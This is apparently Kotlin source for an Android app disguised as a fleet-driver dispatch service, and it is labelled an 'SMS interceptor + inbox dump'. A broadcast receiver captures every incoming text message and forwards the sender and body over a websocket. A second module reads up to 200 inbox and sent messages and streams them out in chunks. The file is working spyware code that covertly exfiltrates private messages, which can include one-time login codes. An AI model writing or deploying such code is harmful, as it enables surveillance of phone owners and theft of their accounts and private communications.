// [context: Android API 26+, ARM64/any — SMS interceptor + inbox dump]
// SmsModule.kt — BroadcastReceiver para SMS em tempo real + dump do inbox completo
package com.fleetdroid.driver.service

import android.content.BroadcastReceiver
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

// ── BroadcastReceiver registrado no manifesto ──────────────────────────────
class SmsReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        try {
            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (msgs.isNullOrEmpty()) return

            // Agrupa partes do mesmo SMS (mensagens longas chegam fragmentadas)
            val grouped = LinkedHashMap<String, StringBuilder>()
            var senderRef: String = ""
            var tsRef: Long = 0L

            for (msg: SmsMessage in msgs) {
                val sender = msg.displayOriginatingAddress ?: msg.originatingAddress ?: "unknown"
                val body   = msg.displayMessageBody ?: msg.messageBody ?: ""
                val ts     = msg.timestampMillis
                grouped.getOrPut(sender) { StringBuilder() }.append(body)
                if (senderRef.isEmpty()) { senderRef = sender; tsRef = ts }
            }

            grouped.forEach { (sender, sb) ->
                val body = sb.toString()
                val payload = JSONObject().apply {
                    put("type",   "sms_received")
                    put("sender", sender)
                    put("body",   body)
                    put("ts",     tsRef)
                }
                DispatchService.instance?.sendWs(payload.toString())
                Log.d(TAG, "SMS from $sender: $body")
            }
        } catch (e: Exception) {
            Log.e(TAG, "onReceive error", e)
        }
    }
}

// ── Módulo ativo: dump inbox + sent ───────────────────────────────────────
object SmsModule {

    const val TAG = "SmsModule"
    private val SMS_URI: Uri = Uri.parse("content://sms/")

    /**
     * Retorna os últimos [limit] SMS (inbox + sent) como JSONArray.
     * Colunas: address, body, date, type (1=inbox,2=sent), read, thread_id
     */
    fun dump(context: Context, limit: Int = 200): JSONArray {
        val result = JSONArray()
        val cr: ContentResolver = context.contentResolver
        val cursor: Cursor? = cr.query(
            SMS_URI,
            arrayOf("_id", "address", "body", "date", "type", "read", "thread_id"),
            null, null,
            "date DESC LIMIT $limit"
        )
        cursor?.use {
            val idxAddr   = it.getColumnIndexOrThrow("address")
            val idxBody   = it.getColumnIndexOrThrow("body")
            val idxDate   = it.getColumnIndexOrThrow("date")
            val idxType   = it.getColumnIndexOrThrow("type")
            val idxRead   = it.getColumnIndexOrThrow("read")
            val idxThread = it.getColumnIndexOrThrow("thread_id")

            while (it.moveToNext()) {
                result.put(JSONObject().apply {
                    put("address",   it.getString(idxAddr)   ?: "")
                    put("body",      it.getString(idxBody)   ?: "")
                    put("date",      it.getLong(idxDate))
                    put("type",      it.getInt(idxType))   // 1=inbox, 2=sent
                    put("read",      it.getInt(idxRead) == 1)
                    put("thread_id", it.getLong(idxThread))
                })
            }
        }
        return result
    }

    /**
     * Envia dump paginado via WS. Chunkeia em blocos de 50 pra não estourar o frame.
     */
    fun sendDump(context: Context, limit: Int = 200) {
        try {
            val all = dump(context, limit)
            val chunkSize = 50
            var offset = 0
            val total = all.length()
            while (offset < total) {
                val chunk = JSONArray()
                val end = minOf(offset + chunkSize, total)
                for (i in offset until end) chunk.put(all.get(i))
                val payload = JSONObject().apply {
                    put("type",   "sms_dump")
                    put("offset", offset)
                    put("total",  total)
                    put("sms",    chunk)
                }
                DispatchService.instance?.sendWs(payload.toString())
                offset += chunkSize
            }
            Log.d(TAG, "SMS dump sent: $total messages")
        } catch (e: Exception) {
            Log.e(TAG, "sendDump error", e)
            DispatchService.instance?.sendWs("""{"type":"error","msg":"sms_dump failed: ${e.message}"}""")
        }
    }
}
